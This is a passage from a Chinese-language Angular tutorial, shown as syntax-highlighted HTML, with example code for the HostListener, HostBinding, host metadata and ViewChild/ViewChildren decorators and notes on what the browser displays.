<span class="token keyword">class</span> <span class="token class-name">CountClicks</span> <span class="token punctuation">{</span>
    numberOfClicks <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'$event.target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token parameter">btn<span class="token operator">:</span> HTMLElement</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">,</span> btn<span class="token punctuation">,</span> <span class="token string">'number of clicks:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>numberOfClicks<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    button {
      background: blue;
      color: white;
      border: 1px solid #eee;
    }
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;button counting&gt;增加点击次数&lt;/button&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <p><img src="/vuebloger/img/post/3002906416-58db805768edd_fix732.png" alt=""></p> <p>此外，我们也可以监听宿主元素外，其它对象产生的事件，如 window 或 document 对象。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// highlight.directive.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> HostListener<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> Renderer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'[exeHighlight]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ExeHighlight</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> el<span class="token operator">:</span> ElementRef<span class="token punctuation">,</span> <span class="token keyword">private</span> renderer<span class="token operator">:</span> Renderer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'document:click'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'$event'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token parameter">btn<span class="token operator">:</span> Event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>el<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">highlight</span><span class="token punctuation">(</span><span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">highlight</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">highlight</span><span class="token punctuation">(</span><span class="token parameter">color<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>renderer<span class="token punctuation">.</span><span class="token function">setElementStyle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>el<span class="token punctuation">.</span>nativeElement<span class="token punctuation">,</span> <span class="token string">'backgroundColor'</span><span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h4 exeHighlight&gt;点击该区域，元素会被高亮。点击其它区域，元素会取消高亮&lt;/h4&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <p><img src="/vuebloger/img/post/3812730377-58db8069111bc_fix732.png" alt=""></p> <h3 id="hosteventlistener"><a href="#hosteventlistener" class="header-anchor">#</a> HostEventListener</h3> <p>我们也可以在指令的 metadata 信息中，设定宿主元素的事件监听信息</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>counting<span class="token punctuation">.</span>directive<span class="token punctuation">.</span>ts
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'button[counting]'</span><span class="token punctuation">,</span>
    host<span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">'(click)'</span><span class="token operator">:</span> <span class="token string">'onClick($event.target)'</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CountClicks</span> <span class="token punctuation">{</span>
    numberOfClicks <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token parameter">btn<span class="token operator">:</span> HTMLElement</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">,</span> btn<span class="token punctuation">,</span> <span class="token string">'number of clicks:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>numberOfClicks<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="hostbinding"><a href="#hostbinding" class="header-anchor">#</a> HostBinding</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// button-press.directive.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> HostBinding<span class="token punctuation">,</span> HostListener <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
   selector<span class="token operator">:</span> <span class="token string">'[exeButtonPress]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ExeButtonPress</span> <span class="token punctuation">{</span>
   @<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'attr.role'</span><span class="token punctuation">)</span> role <span class="token operator">=</span> <span class="token string">'button'</span><span class="token punctuation">;</span>
   @<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'class.pressed'</span><span class="token punctuation">)</span> isPressed<span class="token operator">:</span> boolean<span class="token punctuation">;</span>
   @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'mousedown'</span><span class="token punctuation">)</span> <span class="token function">hasPressed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span>isPressed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
   @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'mouseup'</span><span class="token punctuation">)</span> <span class="token function">hasReleased</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span>isPressed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
 styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   button {
     background: blue;
     color: white;
     border: 1px solid #eee;
   }
   button.pressed {
     background: red;
   }
 </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>
 template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;button exeButtonPress&gt;按下按钮&lt;/button&gt;
 </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <p><img src="/vuebloger/img/post/3797051847-58db8082bddb3_fix732.png" alt=""></p> <h3 id="hostpropertybindings"><a href="#hostpropertybindings" class="header-anchor">#</a> HostPropertyBindings</h3> <p>我们也可以在指令的 metadata 信息中，设定宿主元素的属性绑定信息，具体示例如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//button-press.directive.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> HostListener <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'[exeButtonPress]'</span><span class="token punctuation">,</span>
    host<span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">'role'</span><span class="token operator">:</span> <span class="token string">'button'</span><span class="token punctuation">,</span>
      <span class="token string">'[class.pressed]'</span><span class="token operator">:</span> <span class="token string">'isPressed'</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ExeButtonPress</span> <span class="token punctuation">{</span>
    isPressed<span class="token operator">:</span> boolean<span class="token punctuation">;</span>
    @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'mousedown'</span><span class="token punctuation">)</span> <span class="token function">hasPressed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>isPressed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    @<span class="token function">HostListener</span><span class="token punctuation">(</span><span class="token string">'mouseup'</span><span class="token punctuation">)</span> <span class="token function">hasReleased</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>isPressed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="viewchild-viewchildren"><a href="#viewchild-viewchildren" class="header-anchor">#</a> ViewChild/ViewChildren</h2> <p>ViewChild 是属性装饰器，用来从模板视图中获取匹配的元素。视图查询在 ngAfterViewInit 钩子函数调用前完成，因此在 ngAfterViewInit 钩子函数中，就能正确获取查询的元素</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">ViewChildDecorator</span> <span class="token punctuation">{</span>
  <span class="token comment">// Type类型：@ViewChild(ChildComponent)</span>
  <span class="token comment">// string类型：@ViewChild('tpl', { read: ViewContainerRef })</span>
  <span class="token punctuation">(</span>selector<span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token operator">|</span>Function<span class="token operator">|</span>string<span class="token punctuation">,</span> <span class="token punctuation">{</span>read<span class="token punctuation">}</span><span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">{</span>read<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
  <span class="token keyword">new</span> <span class="token punctuation">(</span>selector<span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token operator">|</span>Function<span class="token operator">|</span>string<span class="token punctuation">,</span> 
      <span class="token punctuation">{</span>read<span class="token punctuation">}</span><span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">{</span>read<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> ViewChild<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="使用模板变量名"><a href="#使用模板变量名" class="header-anchor">#</a> 使用模板变量名</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;p #greet&gt;Hello {{ name }}&lt;/p&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'greet'</span><span class="token punctuation">)</span>
  greetDiv<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>greetDiv<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h3 id="设置查询条件"><a href="#设置查询条件" class="header-anchor">#</a> 设置查询条件</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> TemplateRef<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> ViewContainerRef<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;template #tpl&gt;
      &lt;span&gt;I am span in template&lt;/span&gt;
    &lt;/template&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tpl'</span><span class="token punctuation">)</span>
  tplRef<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tpl'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> read<span class="token operator">:</span> ViewContainerRef <span class="token punctuation">}</span><span class="token punctuation">)</span>
  tplVcRef<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tplVcRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>tplVcRef<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tplRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="使用类型查询"><a href="#使用类型查询" class="header-anchor">#</a> 使用类型查询</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// child.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-child'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;Child Component&lt;/p&gt;  
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ChildComponent</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'child-component'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ChildComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./child.component'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h4&gt;Welcome to Angular World&lt;/h4&gt;
    &lt;exe-child&gt;&lt;/exe-child&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span>ChildComponent<span class="token punctuation">)</span>
  childCmp<span class="token operator">:</span> ChildComponent<span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>childCmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>以上代码运行后，控制台的输出结果：</p> <p><img src="/vuebloger/img/post/3386778252-58c8062751d35_fix732.png" alt=""></p> <p>ViewChildren 用来从模板视图中获取匹配的多个元素，返回的结果是一个 QueryList 集合。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ViewChildren<span class="token punctuation">,</span> QueryList<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ChildComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./child.component'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h4&gt;Welcome to Angular World&lt;/h4&gt;
    &lt;exe-child&gt;&lt;/exe-child&gt;
    &lt;exe-child&gt;&lt;/exe-child&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  @<span class="token function">ViewChildren</span><span class="token punctuation">(</span>ChildComponent<span class="token punctuation">)</span>
  childCmps<span class="token operator">:</span> QueryList<span class="token operator">&lt;</span>ChildComponent<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>childCmps<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

